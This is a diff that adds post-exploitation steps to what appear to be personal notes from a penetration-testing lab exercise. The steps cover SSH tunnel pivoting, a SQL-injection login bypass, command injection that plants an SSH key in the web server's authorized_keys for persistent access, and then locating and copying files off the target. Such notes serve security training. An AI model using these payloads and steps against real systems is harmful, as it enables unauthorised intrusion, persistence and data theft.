@@ -129,9 +129,32 @@ ON MACHINE BEING EXPLOITED
 5. run the expliot in meterpreter (check notes for set up)
 6. run the script
 
-
-
-
+#########################
+   POST EXPLOITATION 
+#########################
+1. ssh student@10.50.39.165 -L 3001:localhost:22 -NT
+2. ssh -p 3001 student@localhost -L 3002:192.168.28.100:80 -NT
+3. firefox
+      localhost:3002/admin/login.php
+4. in username and password type
+      tom' OR 1='1
+5. make .ssh directory and keys document
+      ;mkdir /var/www/.ssh
+      ;touch /var/www/.ssh/authorized_keys
+6. make private key
+      ssh-keygen -t rsa
+      cat ~/.ssh/id_rsa.pub
+7. command injection/ ssh-key injection
+      ;echo "<key_here>" >> /var/www/.ssh/authorized_keys
+8. ssh -p 3001 student@localhost -L 3003:192.168.28.100:2222 -NT
+9. ssh -p 3003 www-data@localhost
+10. find / -name network* 2>/dev/null
+11. ls -la /home/comrade/Dekstop/network
+      cat nmapkey.txt
+12. scp -P 3003 www-data@localhost:/home/comrade/Dekstop/network/map.png
+13. find / -name *inventory* 2>/dev/null
+14.
+15
 
 
 
